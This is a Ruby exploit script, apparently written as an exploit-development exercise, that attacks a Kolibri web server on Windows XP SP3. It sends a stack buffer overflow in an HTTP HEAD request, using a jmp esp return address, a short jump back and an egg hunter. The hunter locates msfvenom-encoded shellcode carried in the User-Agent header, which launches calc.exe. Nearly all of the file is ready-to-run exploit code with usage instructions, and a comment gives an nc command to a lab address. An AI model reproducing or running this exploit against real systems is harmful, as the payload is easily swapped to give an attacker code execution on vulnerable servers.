# Brad Beacham 2018
#
#####################################################################################
# INFORMATION
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
# Confirmed on Windows XP SP3
####    EIP contains normal pattern : 0x32724131 (offset 515)
####    ESP (0x0124fb28) points at offset 519 in normal pattern (length 81)
####    0x7c9d30d7 : jmp esp | (C:\WINDOWS\system32\SHELL32.dll)
# Badchars: "\x00\x0d\x0a\x3d\x20\x3f"
# nc -nv 192.168.217.133 9876

#####################################################################################

require 'socket'

# Appends notifications to the start of text (ie. [*], [+], etc)
#####################################################################################
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end		  # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end
# Some simple input validation
input = ARGV
if input[0].nil?
	puts "USAGE: KolibriExploit.rb [<ipaddres>:<port>]".error
	abort()
elsif !input[0].include? ":"
	puts "USAGE: KolibriExploit.rb [<ipaddres>:<port>]".error
	abort()
end
host = input[0].split(":").first
port = input[0].split(":").last

puts "#######################################################".event
#####################################################################################
# Generate the exploit
buffer = 0
offset = 515

#Opcode to jump back 60 bytes
shortJump = "\xEB\xC4"
# Br4D Egg Hunter
egg = "\x42\x72\x34\x44" * 2
hunter =
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" +
"\xef\xb8\x42\x72\x34\x44\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00\x0d\x0a\x3d\x20\x3f' -i 3 -f ruby
buf =
"\xba\x49\x2b\xd9\x40\xda\xd3\xd9\x74\x24\xf4\x5f\x29\xc9" +
"\xb1\x3e\x31\x57\x15\x03\x57\x15\x83\xc7\x04\xe2\xbc\x93" +
"\x09\x78\xb0\x16\x72\xb7\x15\xa2\xa1\xbc\xfe\x78\x63\x8d" +
"\x38\xfc\xb0\xea\x09\x41\x39\xf0\xfa\x73\x29\xf1\x32\xfd" +
"\x18\x61\x1e\xfe\x49\x7c\x27\x9a\x06\x6f\xbd\x39\x04\x4e" +
"\x9c\xc4\xb0\x50\xeb\x82\x89\xcf\xaf\xdb\xf4\xf9\x58\x35" +
"\x30\xd9\x28\x01\xc0\xee\xbc\x2c\x83\x91\x1e\x81\xbd\x26" +
"\xca\x54\x69\xac\x97\x97\xe2\x71\xb4\x69\xbf\xbd\xb6\x52" +
"\xbb\x42\x5f\xdf\xb0\x8b\xf0\xd7\xfa\xae\xb2\xe8\x74\xae" +
"\xa4\x84\x13\x78\x0f\x2e\xf6\x2d\xb9\xb4\x91\xf6\x7c\xf1" +
"\xe4\x72\xbd\xb9\xab\xbd\xdd\x38\xed\xc9\x93\xa4\x0b\x5e" +
"\xa3\x3e\xea\xfb\x70\x58\xb4\x8d\xc5\x81\xf9\xcf\x34\xae" +
"\xb3\xe2\x7a\x94\x7d\x67\x60\x99\xcd\xed\x38\x7c\x9b\x92" +
"\xd7\x33\x6a\x68\x7b\x3a\xbe\xad\x4e\x96\x8e\x2f\x3a\x94" +
"\xc1\x1f\x1c\xf0\x54\xba\xa1\xa5\x78\x8c\xd1\x92\x19\x13" +
"\xa5\x02\x15\x92\x5f\x5b\xab\x1e\x7d\x59\x14\x19\xdd\xd1" +
"\x2f\x26\x83\x7d\x41\xa3\x74\x7f\xf4\x66\x73\x03\x1e\xd1" +
"\x64\x4b\xb9\x4a\xc2\x58\xbe\xdd\xb7\xd0\x34\xf2\x15\xf6" +
"\x54\x56\x03\x2d\xc0\x48\x13\x7b\xc0\xe2\x46\x21\x6b\x4e" +
"\x69\x87\x89\x1e\x33\x2d\x98\xec"


junk = "\x41"
eip = "\xd7\x30\x9d\x7c"
# We want to place the egghunter at the location where we jump too, which i in practice is 0x0124FB2B - 0x3C
huntOffset = (offset + eip.length + shortJump.length) - 60
stage1 = (junk * huntOffset) + hunter + junk * (offset - (huntOffset + hunter.length)) + eip + shortJump

stage2 = egg + buf

exploit = (
    "HEAD /#{stage1} HTTP/1.1\r\n" +
    "Host: #{host}:#{port}\r\n" +
    "User-Agent: #{stage2}\r\n" +
    "Keep-Alive: 115\r\n" +
    "Connection: keep-alive\r\n\r\n"
)

#####################################################################################
# Send the exploit
begin
    puts "Stage 1 size [#{stage1.length}] bytes.".notification
    puts "Stage 2 size [#{stage2.length}] bytes.".notification
    puts ""
    puts "Connecting to server [#{host}:#{port}] and sending evil buffer".event
    socket = TCPSocket.new(host, port)
rescue
    puts "Unable to connect to server!".error
else
    puts "Sucessfully connected!".success
	socket.write(exploit)
    socket.close
    puts "Exploit completed.  Calculator will spawn on the target shortly.".success
end
 
puts ""
